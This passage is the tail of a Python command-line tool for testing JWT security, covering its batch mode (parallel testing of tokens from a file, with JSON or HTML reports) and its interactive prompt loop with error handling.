        elif args.file:
            tester.print_header("🔒 JWT Security Testing Tool - Batch Mode")
            try:
                with open(args.file, 'r') as f:
                    tokens = [line.strip() for line in f if line.strip()]
                tester.print_info(f"📁 Testing {len(tokens)} tokens from {args.file}")
                valid_tokens = []
                invalid_tokens = []
                for i, token in enumerate(tokens, 1):
                    if tester.validate_jwt_token(token):
                        valid_tokens.append(token)
                    else:
                        invalid_tokens.append((i, token))
                if invalid_tokens:
                    tester.print_warning(f"Found {len(invalid_tokens)} invalid tokens:")
                    for line_num, token in invalid_tokens[:5]:
                        tester.print_warning(f"  Line {line_num}: {token[:50]}...")
                    if len(invalid_tokens) > 5:
                        tester.print_warning(f"  ... and {len(invalid_tokens) - 5} more")
                if not valid_tokens:
                    tester.print_error("No valid JWT tokens found in file")
                    sys.exit(1)
                tester.print_info(f"Proceeding with {len(valid_tokens)} valid tokens")
                all_results = []
                errors = []
                def process_token(token):
                    try:
                        return tester.comprehensive_test(token, args.secret)
                    except Exception as e:
                        return {"error": str(e), "token_preview": token[:50]}
                workers = args.workers or tester.config.get_default("workers", max(1, multiprocessing.cpu_count() // 2))
                with concurrent.futures.ProcessPoolExecutor(max_workers=workers) as executor:
                    futures = {executor.submit(process_token, token): token for token in valid_tokens}
                    from tqdm import tqdm
                    for future in tqdm(concurrent.futures.as_completed(futures), total=len(valid_tokens), desc="Batch Progress"):
                        result = future.result()
                        all_results.append(result)
                        if "error" in result:
                            errors.append(result)
                combined_report = {
                    "batch_report": {
                        "title": "JWT Security Batch Analysis",
                        "generated_date": datetime.now().isoformat(),
                        "tokens_tested": len(valid_tokens),
                        "invalid_tokens": len(invalid_tokens),
                        "results": all_results,
                        "errors": errors
                    }
                }
                output_file = args.output or f"jwt_batch_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
                if output_file.endswith(".json"):
                    with open(output_file, 'w') as f:
                        json.dump(combined_report, f, indent=2)
                else:
                    tester.generate_html_report(combined_report, output_file)
                tester.print_success(f"Batch report saved: {output_file}")
            except FileNotFoundError:
                tester.print_error(f"File not found: {args.file}")
                sys.exit(1)
        
        else:
            # Interactive mode
            tester.print_header("🔒 JWT Security Testing Tool - Interactive Mode")
            
            while True:
                token = input(f"\n{Fore.CYAN}Enter JWT token (or 'quit' to exit): {Style.RESET_ALL}").strip()
                if token.lower() == 'quit':
                    break
                
                if not token:
                    tester.print_error("Please enter a valid JWT token")
                    continue
                
                if not tester.validate_jwt_token(token):
                    tester.print_error("Invalid JWT token format")
                    continue
                
                try:
                    results = tester.comprehensive_test(token)
                    tester.print_summary(results)
                    tester.print_vulnerabilities(results)
                    
                    save_choice = input(f"\n{Fore.YELLOW}Save report? (y/n): {Style.RESET_ALL}").lower().strip()
                    if save_choice == 'y':
                        output_file = input(f"{Fore.CYAN}Enter output filename (or press Enter for default): {Style.RESET_ALL}").strip()
                        if not output_file:
                            output_file = None
                        if output_file and output_file.endswith(".json"):
                            tester.generate_report(results, output_file)
                        else:
                            tester.generate_html_report(results, output_file)
                    
                except Exception as e:
                    tester.print_error(f"Error testing token: {str(e)}")
            
            tester.print_success("Thank you for using JWT Security Testing Tool!")
    
    except KeyboardInterrupt:
        tester.print_warning("\nOperation cancelled by user")
        sys.exit(1)
    except Exception as e:
        tester.print_error(f"Unexpected error: {str(e)}")
        if args.debug:
            import traceback
            traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main() 